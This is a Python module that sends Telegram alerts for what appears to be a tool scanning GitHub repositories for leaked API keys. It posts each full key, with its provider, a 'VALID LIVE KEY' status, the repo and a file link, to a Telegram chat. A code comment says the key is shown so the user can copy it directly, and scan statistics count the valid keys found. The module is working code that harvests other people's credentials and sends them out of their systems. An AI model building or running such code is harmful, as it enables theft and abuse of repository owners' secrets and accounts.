import httpx
import logging
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

log = logging.getLogger(__name__)

_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"


async def _send(text: str, parse_mode: str = "HTML"):
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            await c.post(_URL, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True,
            })
    except Exception as e:
        log.error("telegram send err: %s", e)


async def notify_found(provider: str, key: str, repo: str, file_path: str,
                       file_url: str, stars: int, created_at: str,
                       file_type: str, is_valid: bool):
    status = "✅ VALID LIVE KEY" if is_valid else "⚠️ FOUND (unverified)"
    age_label = f"created {created_at[:10]}"

    # Full key in monospace — user can copy directly
    msg = (
        f"{status}\n"
        f"<b>Provider:</b> {provider.upper()}\n"
        f"<b>Key:</b> <code>{key}</code>\n"
        f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>\n"
        f"<b>Stars:</b> ⭐ {stars}  |  {age_label}\n"
        f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
        f"<b>Type:</b> {file_type}"
    )
    await _send(msg)


async def notify_cycle_done(stats: dict):
    msg = (
        f"🔄 Scan cycle done\n"
        f"Repos: {stats['repos_scanned']} | Files: {stats['files_scanned']}\n"
        f"Keys found: {stats['keys_found']} (valid: {stats['keys_valid']})"
    )
    await _send(msg)
